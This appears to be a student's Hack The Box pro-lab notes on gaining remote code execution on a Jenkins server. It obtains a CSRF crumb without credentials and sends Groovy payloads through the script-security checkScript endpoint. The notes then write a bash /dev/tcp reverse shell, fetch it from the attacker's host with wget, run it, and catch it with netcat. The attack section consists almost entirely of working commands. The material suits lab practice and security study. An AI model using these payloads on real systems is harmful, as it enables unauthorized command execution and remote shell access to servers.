
# Crumb error identification
Originally I tried this and gave up because I saw the `crumb` error and after initial research came to the conclusion this was unusable due to not having a valid user.
![[Pasted image 20240430161844.png]]
```shell
┌──(kali㉿gobots)-[29Apr2024 16:36:24]-[~/SUT/Genesis_proLab_htB/10.10.110.102]                                                                                                                             
└─$ curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def pr
oc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'                                                                                 
<html>                                                                                                                                                                                                        
<head>                                                                                                                                                                                                      
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>                                                                                                                                         
<title>Error 403 No valid crumb was included in the request</title>                                                                                                                                         
</head>                                                                                                                                                                                                     
<body><h2>HTTP ERROR 403</h2>                                                                                                                                                                               
<p>Problem accessing /descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/. Reason:                                                                         
<pre>    No valid crumb was included in the request</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>

</body>
</html>
```

### Crumb issue links found
- the italisized one is the one that led me to get the crumb
https://stackoverflow.com/questions/16738441/how-to-request-for-the-crumb-issuer-for-jenkins
***https://stackoverflow.com/questions/44711696/jenkins-403-no-valid-crumb-was-included-in-the-request***
https://stackoverflow.com/questions/56179580/jenkins-groovy-pipeline-org-jenkinsci-plugins-scriptsecurity-sandbox-rejectedacc

Using the link above takes you to a stack overflow page talking about the error, if you keep scrolling down the page there is a command that someone recommends that shows how to get the crumb without a password

![[Pasted image 20240430163711.png]]\
### Original
```bash
curl -X POST 'http://localhost:8090/configuration-as-code/export' -H "Jenkins-Crumb:$(curl -s -X GET http://localhost:8090/crumbIssuer/api/json | python3 -c 'import sys, json; print(json.load(sys.stdin)["crumb"])')" -v
```
### Modified curl
- changed IP's to match the jenkins server IPs
```bash
curl -X POST 'http://10.10.110.102:8080/configuration-as-code/export' -H "Jenkins-Crumb:$(curl -s -X GET http://10.10.110.102:8080/crumbIssuer/api/json | python3 -c 'import sys, json; print(json.load(sys.stdin)["crumb"])')" -v
```

![[Pasted image 20240430164113.png]]
This allows us to get a valid crumb to authenticate with to the jenkins server ***WITHOUT CREDENTIALS*** with the command below.
- utilizing the post in the screenshot above also shows how to utilize the crumb with `-H 'Jenkins-Crumb: 7dbe87878c99112eef8e97022ccc7ea4'`

### Command to test Arbitrary Code Execution
```BASH
curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget 10.10.14.39/bla.txt".execute()}}' -H 'Jenkins-Crumb: 7dbe87878c99112eef8e97022ccc7ea4'
```
### Python server setup 
```bash
python3 -m http.server 8001
```

### Now we know Command execution works time to get a reverse shell
![[Pasted image 20240430170703.png]]
# revshell.sh creation
```bash
bash -i >& /dev/tcp/10.10.14.39/1337 0>&1
```
![[Pasted image 20240430170914.png]]
# wget revshell.sh
- command used to pull the reverse shell over
```bash
┌──(kali㉿gobots)-[30Apr2024 20:57:35]-[~/SUT/Genesis_proLab_htB/10.10.110.102]
└─$ curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget 10.10.14.39:8001/revshell.sh".execute()}}' -H 'Jenkins-Crumb: 7dbe87878c99112eef8e97022ccc7ea4'
```
![[Pasted image 20240430171519.png]]
# revshell.sh execution
- note that in order to get it to the shell to actually execute must run `bash` in front
```bash
┌──(kali㉿gobots)-[30Apr2024 21:15:46]-[~/SUT/Genesis_proLab_htB/10.10.110.102]
└─$ curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"bash ./revshell.sh".execute()}}' -H 'Jenkins-Crumb: 7dbe87878c99112eef8e97022ccc7ea4'
<div/>                          
```
setting up listener
```bash
┌──(kali㉿gobots)-[30Apr2024 21:15:59]-[~/SUT/Genesis_proLab_htB/10.10.110.102]                       
└─$ nc -lvnp 1337                                                                                     
listening on [any] 1337 ...  
```
![[Pasted image 20240430180257.png]]

